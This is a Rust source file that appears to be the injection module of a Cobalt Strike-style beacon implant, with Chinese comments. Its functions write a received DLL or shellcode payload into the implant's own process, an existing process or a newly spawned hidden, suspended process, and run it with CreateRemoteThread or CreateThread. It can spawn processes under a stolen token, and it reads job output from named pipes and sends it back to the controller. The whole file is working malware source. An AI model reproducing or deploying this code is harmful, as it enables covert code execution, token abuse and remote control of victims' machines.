use std::ffi::c_void;
use std::fs::File;
use std::io::{Cursor, Write};
use std::ptr::null_mut;
use std::sync::Arc;
#[cfg(target_os = "windows")]
use std::{mem, thread};

use anyhow::Error;
use windows_sys::core::PWSTR;
use windows_sys::Win32::Foundation::{
    GetLastError, BOOL, GENERIC_READ, HANDLE, INVALID_HANDLE_VALUE,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, ReadFile, FILE_ATTRIBUTE_NORMAL, OPEN_EXISTING,
};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    VirtualAlloc, VirtualAllocEx, VirtualProtect, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE,
    PAGE_EXECUTE_READ, PAGE_READWRITE,
};
use windows_sys::Win32::System::Threading::{
    CreateProcessW, CreateProcessWithTokenW, CreateRemoteThread, CreateThread, GetCurrentProcess,
    GetCurrentProcessId, OpenProcess, WaitForSingleObject, CREATE_NO_WINDOW, CREATE_SUSPENDED,
    LOGON_WITH_PROFILE, PROCESS_CREATE_THREAD, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
    PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE, STARTF_USESTDHANDLES, STARTUPINFOW,
};
use windows_sys::Win32::System::IO::OVERLAPPED;

use crate::beacon::token::{IS_STRAL_TOKEN, STEAL_TOKEN};
use crate::config::{INJECT_SELF, SPAWN_PROCESS};
use crate::util::data_parse::{
    beacon_read_i32, beacon_read_length_and_string, beacon_read_short, beacon_send_result,
    read_remaining_data,
};
use crate::util::encode::to_wide_string;
use crate::util::jobs::CALLBACK_OUTPUT;
use crate::BEACON;

static mut CURRENT_PID: u32 = 0;
static mut CURRENT_HANDLE: HANDLE = INVALID_HANDLE_VALUE;

// 为了job处理
fn update_current_handle(pid: u32, handle: HANDLE) {
    unsafe {
        CURRENT_PID = pid;
        CURRENT_HANDLE = handle;
    }
}
//新拉起进程注入dll or 注入自身
pub fn spawn_and_inject_dll(
    mut decrypted_cursor: Cursor<Vec<u8>>,
    is_x64: bool,
    is_ignore_token: bool,
) {
    update_current_handle(0, INVALID_HANDLE_VALUE);
    let (_, dll) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();

    if INJECT_SELF {
        let pid = unsafe { GetCurrentProcessId() };
        let result = inject_self(dll, 0);
        if result {
            let message = "inject self success";
            println!("{}", message);
            update_current_handle(pid, unsafe { GetCurrentProcess() });
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        } else {
            let message = "inject self failed";
            println!("{}", message);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap()
        }
    } else {
        let mut proc_info: PROCESS_INFORMATION = unsafe { mem::zeroed() };
        let mut startup_info: STARTUPINFOW = unsafe { mem::zeroed() };
        startup_info.cb = mem::size_of::<STARTUPINFOW>() as u32;
        startup_info.dwFlags = STARTF_USESTDHANDLES; // 使用标准句柄
        startup_info.wShowWindow = 1; // 显示窗口

        let result = my_create_process(
            to_wide_string(SPAWN_PROCESS).as_ptr(),
            null_mut(),
            true,
            CREATE_NO_WINDOW | CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut startup_info,
            &mut proc_info,
            is_ignore_token,
        );
        if result == false {
            return;
        }
        let result = custom_inject(proc_info.hProcess, dll, 0);
        if result == false {
            let message = "inject failed";
            eprintln!("{}", message);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        } else {
            let message = "inject success";
            println!("{}", message);
            update_current_handle(proc_info.dwProcessId, proc_info.hProcess);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        }
    }
}

// dll注入已有进程
pub fn inject_dll(mut decrypted_cursor: Cursor<Vec<u8>>, is_x64: bool) {
    update_current_handle(0, INVALID_HANDLE_VALUE);
    let _cmd_len = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let pid = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let offset = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let dll = read_remaining_data(&mut decrypted_cursor).unwrap();
    let current_pid = unsafe { GetCurrentProcessId() };
    if pid == current_pid as i32 {
        let result = inject_self(dll, offset as u32);
        if result {
            let message = "inject self success";
            println!("{}", message);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        } else {
            let message = "inject self failed";
            println!("{}", message);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap()
        }
    } else {
        // 定义所需权限
        let desired_access = PROCESS_CREATE_THREAD
            | PROCESS_VM_OPERATION
            | PROCESS_VM_WRITE
            | PROCESS_VM_READ
            | PROCESS_QUERY_INFORMATION;

        // 打开进程
        let process_handle: HANDLE = unsafe { OpenProcess(desired_access, 1, pid as u32) };

        // 检查是否打开成功
        if process_handle == 0 as HANDLE {
            // 获取错误码
            let error_message = format!("OpenProcess failed. Error code: {}", unsafe {
                GetLastError()
            });
            eprintln!("{}", error_message);
            beacon_send_result(error_message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
            return;
        }
        let result = custom_inject(process_handle, dll, offset as u32);
        if result == false {
            let message = "inject dll failed";
            eprintln!("{}", message);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        } else {
            let message = "inject dll success";
            println!("{}", message);
            update_current_handle(pid as u32, process_handle);
            beacon_send_result(message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
        }
    }
}
fn inject_self(dll: Vec<u8>, offset: u32) -> bool {
    let addr = unsafe {
        VirtualAlloc(
            null_mut(),
            dll.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    if addr.is_null() {
        unsafe {
            eprintln!("VirtualAlloc failed {}", GetLastError());
        }
        return false;
    }
    let mut bytes_written: usize = 0;
    let result = unsafe {
        WriteProcessMemory(
            GetCurrentProcess(), // self (InvalidHandle)
            addr,
            dll.as_ptr() as *const _,
            dll.len(),
            &mut bytes_written,
        )
    };
    if result == 0 {
        unsafe {
            eprintln!("WriteProcessMemory failed {}", GetLastError());
        }
        return false;
    }
    let mut old_protect: u32 = 0;
    let result = unsafe { VirtualProtect(addr, dll.len(), PAGE_EXECUTE_READ, &mut old_protect) };
    if result == 0 {
        unsafe {
            eprintln!("VirtualProtect failed {}", GetLastError());
        }
        return false;
    }
    let mut thread_id: u32 = 0;
    let h_thread = unsafe {
        CreateThread(
            null_mut(),
            0,
            Some(std::mem::transmute(addr.add(offset as usize))),
            null_mut(),
            0,
            &mut thread_id,
        )
    };

    if h_thread as i32 == 0 {
        unsafe {
            eprintln!("CreateThread failed {}", GetLastError());
        }
        return false;
    }
    return true;
}
// 创建新进程，区分是否使用 steal_token
fn my_create_process(
    app_name: *const u16,                    // 应用程序名称
    command_line: *const u16,                // 命令行参数
    inherit_handles: bool,                   // 是否继承句柄
    creation_flags: u32,                     // 创建标志
    env: *const u16,                         // 环境变量
    current_dir: *const u16,                 // 当前工作目录
    startup_info: *const STARTUPINFOW,       // 启动信息
    out_proc_info: &mut PROCESS_INFORMATION, // 输出的进程信息
    is_ignore_token: bool,
) -> bool {
    unsafe {
        // 判断是否使用 steal_token
        if IS_STRAL_TOKEN {
            let result = CreateProcessWithTokenW(
                STEAL_TOKEN,
                LOGON_WITH_PROFILE,
                app_name,
                command_line as PWSTR,
                creation_flags,
                env as *const c_void,
                current_dir,
                startup_info,
                out_proc_info,
            );
            if result == 0 {
                let error_message = format!(
                    "CreateProcessWithTokenW failed. Error code: {}",
                    GetLastError()
                );
                beacon_send_result(error_message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
                return false;
            }
        } else {
            let result = CreateProcessW(
                app_name,
                command_line as PWSTR,
                null_mut(),
                null_mut(),
                BOOL::from(inherit_handles),
                creation_flags,
                env as *const c_void,
                current_dir,
                startup_info,
                out_proc_info,
            );
            if result == 0 {
                let error_message =
                    format!("CreateProcessW failed. Error code: {}", GetLastError());
                beacon_send_result(error_message.as_bytes(), &BEACON, CALLBACK_OUTPUT).unwrap();
                return false;
            }
        }
    }
    return true;
}

fn custom_inject(process_handle: HANDLE, dll: Vec<u8>, offset: u32) -> bool {
    let addr = unsafe {
        VirtualAllocEx(
            process_handle,
            null_mut(),
            dll.len(),
            MEM_RESERVE | MEM_COMMIT,
            PAGE_READWRITE,
        )
    };
    if addr.is_null() {
        unsafe {
            eprintln!("VirtualAlloc failed {}", GetLastError());
        }
        return false;
    }
    let mut bytes_written: usize = 0;
    let result = unsafe {
        WriteProcessMemory(
            process_handle, // self (InvalidHandle)
            addr,
            dll.as_ptr() as *const _,
            dll.len(),
            &mut bytes_written,
        )
    };
    if result == 0 {
        unsafe {
            eprintln!("WriteProcessMemory failed {}", GetLastError());
        }
        return false;
    }
    let mut old_protect: u32 = 0;
    let result = unsafe {
        VirtualProtectEx(
            process_handle,
            addr,
            dll.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if result == 0 {
        unsafe {
            eprintln!("VirtualProtectEx failed {}", GetLastError());
        }
        return false;
    }

    let result = unsafe {
        CreateRemoteThread(
            process_handle,
            null_mut(),
            0,
            Some(mem::transmute(addr.add(offset as usize))),
            null_mut(),
            0,
            null_mut(),
        )
    };
    if result == 0 as HANDLE {
        unsafe {
            eprintln!("CreateRemoteThread failed {}", GetLastError());
        }
    }
    return true;
}

struct Job {
    jid: i32,                    // Job ID
    pid: u32,                    // Process ID
    handle: HANDLE,              // Handle to inject the job
    description: String,         // Job description
    callback: i32,               // Callback type
    pipe_name: String,           // Name of the pipe
    sleep_time: u16,             // Sleep time
    ctx: tokio::sync::Mutex<()>, // Context (can be used for cancellation)
}

impl Job {
    fn new(
        jid: i32,
        pid: u32,
        handle: HANDLE,
        description: String,
        callback: i32,
        pipe_name: String,
        sleep_time: u16,
    ) -> Self {
        Self {
            jid,
            pid,
            handle,
            description,
            callback,
            pipe_name,
            sleep_time,
            ctx: tokio::sync::Mutex::new(()), // Initialize the context
        }
    }
}
// Global variables to store jobs and job count
static mut JOB_CNT: i32 = 0;
static mut JOBS: Vec<Arc<Job>> = Vec::new();
unsafe impl Send for Job {}
unsafe impl Sync for Job {}

pub fn job_handle(mut decrypted_cursor: Cursor<Vec<u8>>) {
    // 打开或创建文件
    let mut file = match File::create("decrypted_output.bin") {
        Ok(f) => f,
        Err(e) => {
            eprintln!("Failed to create file: {}", e);
            return;
        }
    };

    // 将解密后的数据写入文件
    if let Err(e) = file.write_all(decrypted_cursor.get_ref()) {
        eprintln!("Failed to write to file: {}", e);
        return;
    }

    // 确保数据写入磁盘
    if let Err(e) = file.flush() {
        eprintln!("Failed to flush file: {}", e);
        return;
    }
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let _ = beacon_read_i32(&mut decrypted_cursor).unwrap();
    let callback_type = beacon_read_short(&mut decrypted_cursor).unwrap();
    let mut sleep_time = beacon_read_short(&mut decrypted_cursor).unwrap();
    if sleep_time < 1000 {
        sleep_time = 1000
    }
    let (_, pipe_name) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    let trimmed_pipe_name = String::from_utf8_lossy(&*pipe_name)
        .trim_end_matches('\0')
        .to_string();
    let (_, description) = beacon_read_length_and_string(&mut decrypted_cursor).unwrap();
    if unsafe { CURRENT_PID } == 0 {
        return;
    }
    let job = Arc::new(Job {
        jid: unsafe { JOB_CNT },
        pid: unsafe { CURRENT_PID },
        handle: unsafe { CURRENT_HANDLE },
        description: String::from_utf8_lossy(&*description).to_string(),
        callback: callback_type as i32,
        pipe_name: trimmed_pipe_name,
        sleep_time: sleep_time as u16,
        ctx: tokio::sync::Mutex::new(()),
    });
    unsafe {
        JOB_CNT += 1;
        JOBS.append(&mut vec![Arc::clone(&job)]);
    }
    let job_clone = Arc::clone(&job);

    let handle = thread::spawn(move || unsafe {
        if let Err(e) = read_named_pipe(job_clone) {
            eprintln!("Error: {:?}", e);
        }
    });
}
unsafe extern "system" fn read_named_pipe(job: Arc<Job>) -> Result<(), Error> {
    thread::sleep(std::time::Duration::from_millis(100));
    let mut count = job.sleep_time / 100;
    let mut pipe_handle = 0 as HANDLE;
    while count > 0 {
        pipe_handle = unsafe {
            CreateFileW(
                to_wide_string(&job.pipe_name).as_ptr(),
                GENERIC_READ,
                0,
                null_mut(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                0 as HANDLE,
            )
        };
        if pipe_handle != 0 as HANDLE {
            break;
        }
        thread::sleep(std::time::Duration::from_millis(100));
        count -= 1;
    }
    if pipe_handle == 0 as HANDLE {
        eprintln!("CreateFileW failed {}", GetLastError());
    }

    // 从管道中读取输出
    let mut buffer = [0u8; 10000];
    let mut bytes_read = 0;
    let mut overlapped: OVERLAPPED = unsafe { std::mem::zeroed() };

    if ReadFile(
        pipe_handle,
        buffer.as_mut_ptr(),
        buffer.len() as u32,
        &mut bytes_read,
        &mut overlapped,
    ) == 0
    {
        eprintln!("Failed to read from pipe");
    }

    let output = String::from_utf8_lossy(&buffer[..bytes_read as usize]);
    println!("Command output: {}", output);
    beacon_send_result(output.as_bytes(), &BEACON, job.callback as u32).unwrap();

    Ok(())
}
